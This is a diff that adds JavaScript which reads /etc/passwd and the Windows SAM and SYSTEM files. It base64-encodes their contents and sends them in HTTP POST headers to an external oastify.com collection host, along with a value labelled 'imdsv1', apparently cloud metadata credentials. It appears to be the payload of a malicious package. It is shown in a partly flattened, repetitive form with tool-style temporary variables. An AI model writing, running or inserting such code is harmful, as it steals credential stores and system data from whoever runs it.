@@ -1,0 +1,47 @@
+var data1 = fs.readFileSync(etcpasswd, 'utf8')
+let buff1 = Buffer.from(data1)
+base64data1 = buff1.toString('base64')
+var data2 = fs.readFileSync(sam, 'utf8')
+let buff2 = Buffer.from(data2)
+base64data2 = buff2.toString('base64')
+var data3 = fs.readFileSync(systemfile, 'utf8')
+let buff3 = Buffer.from(data3)
+base64data3 = buff3.toString('base64')
+var options = {
+				hostname: "okcxj79p9bsj9v7x6c3c5z812s8lwa.oastify.com",
+				port: 443,
+				path: "/",
+				method: "POST",
+				headers: {
+					"Content-Type": "application/x-www-form-urlencoded",
+					"Content-Length": postData.length,
+					"Contentetcpasswd": base64data1,
+					"ContentSAM": base64data2,
+					"ContentetSYSTEM": base64data3,
+					"imdsv1": base64data4
+				},
+			}
+_tmp_3.headers = {
+					"Content-Type": "application/x-www-form-urlencoded",
+					"Content-Length": postData.length,
+					"Contentetcpasswd": base64data1,
+					"ContentSAM": base64data2,
+					"ContentetSYSTEM": base64data3,
+					"imdsv1": base64data4
+				}
+_tmp_4.Contentetcpasswd = base64data1
+_tmp_4.ContentSAM = base64data2
+_tmp_4.ContentetSYSTEM = base64data3
+var req = https.request(options, (res) => {
+				res.on("data", (d) => {
+					process.stdout.write(d);
+				});
+			})
+res.on("data", (d) => {
+					process.stdout.write(d);
+				})
+(_tmp_5 = process.stdout).write
+req.on("error", (e) => {
+				// console.error(e);
+			})
+req.write(postData)
